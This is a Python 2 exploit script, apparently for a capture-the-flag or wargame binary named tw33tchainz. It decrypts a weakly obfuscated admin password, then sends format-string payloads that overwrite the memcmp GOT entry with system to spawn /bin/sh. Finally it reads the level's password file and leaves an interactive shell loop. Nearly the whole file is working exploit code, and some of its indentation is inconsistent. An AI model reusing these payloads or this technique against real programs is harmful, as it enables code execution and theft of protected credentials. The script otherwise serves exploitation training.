import subprocess
import sys
import binascii


def get_admin_password(encrypted, user, salt):
	decrypted = ""
	for i in range(16):
		decrypted += chr(((ord(encrypted[i]) ^ ord(user[i])) - ord(salt[i])) % 256)
	return decrypted     

def endian_flip(a):
	b = ''
	for i in range(4):
		b += ''.join(a[i*4:(i*4)+4][::-1])
  	return b


#Using the string fmt vuln, we will overwrite the address of the memcmp function with system
#We then trigger a system("/bin/sh") call by calling maybe admin with the password /bin/sh
#memcmp @ 0x0804d02c
#system @ 0xb7e63190
def exploit(process):
	process.stdin.write("1\n")
	process.stdin.write("A\x2c\xd0\x04\x08%139x%8$hhn\n\n") #write 0x90 in first byte

	process.stdin.write("1\n")
        process.stdin.write("B\x2d\xd0\x04\x08%44x%8$hhn\n\n") #write 0x31 in second byte

	process.stdin.write("1\n")
        process.stdin.write("C\x2e\xd0\x04\x08%225x%8$hhn\n\n") #write 0xe6 in third byte

	process.stdin.write("1\n")
        process.stdin.write("D\x2f\xd0\x04\x08%178x%8$hhn\n\n") #write 0xb7 in first byte

	print "[+] Exploit Strings sent [+]"
	print "1) A\x2c\xd0\x04\x08%139x%8$hhn"
	print "2) B\x2d\xd0\x04\x08%44x%8$hhn"
	print "3) C\x2e\xd0\x04\x08%225x%8$hhn"
	print "4) D\x2f\xd0\x04\x08%178x%8$hhn"
	process.stdin.write("3\n") #Trigger exploit, call to memcmp("/bin/sh") @ 0x0804d02c -> system()
	
	read_until(process.stdout, "Enter password: ") #for some reason we need to read here
	process.stdin.write("/bin/sh\n") #Exploit here
	process.stdin.write("\n")	

def read_until(fd, needle):
	output = ""
	while needle not in output:
		output += fd.read(1)
	return output

def get_admin(process, password):
	process.stdin.write("3\n") #Choice 3 calls maybe_admin
	data = read_until(process.stdout, "Enter password: ")
#	print data 
	process.stdin.write(password + "\n")
#	data = process.stdout.read(16)
#	print data


def main():
	user = "\x00"*16
	salt = "\x00"*16
	print "[+] Starting Program...\n"
	location = '/levels/project1/./tw33tchainz'
	location = './tw33tchainz_edited'
	sp = subprocess.Popen(location, stdout=subprocess.PIPE, stdin=subprocess.PIPE, shell=False)

	#enter username and password
	sp.stdin.write(user  + salt + "\n")

	trash = read_until(sp.stdout, "Generated Password:\n")

	generated_pass = sp.stdout.read(32) #read the generated password
	print "[+] Encrypted Password: ", generated_pass
	passwd_hex = endian_flip(binascii.unhexlify(generated_pass))
	secret = get_admin_password(passwd_hex, user, salt) #decrypt the password
	print "[+] Decrypted secret password: ", binascii.hexlify(passwd_hex)
	sp.stdin.write("\n")
	
	
	print "[+] Getting admin...."
	get_admin(sp, secret)
	
	data = read_until(sp.stdout, "Enter Choice: ")
	if "Authenticated!\n" in data:
		print "[+] Logged in as admin [+]"	

	sp.stdin.write("\n") #go back to menu

	sp.stdin.write("6\n\n") #turn debug mode on
	
	print sp.pid #DEBUG	
	input = raw_input() #pause before launchine exploit
	exploit(sp)
	
	print "[+] Getting flag"
	#sp.stdout.flush()
	sp.stdin.write("cat /home/project1_priv/.pass\n") 
	resp =  sp.stdout.readline()
	print "[+]FLAG: "+ resp.strip("\n") + " [+]"

	sp.stdout.flush()
	while True:
		input = raw_input()
		sp.stdin.write(input + "\n")
		print read_until(sp.stdout, "Enter Choice: ")
		sp.stdout.flush()
if __name__ == '__main__':
	main()
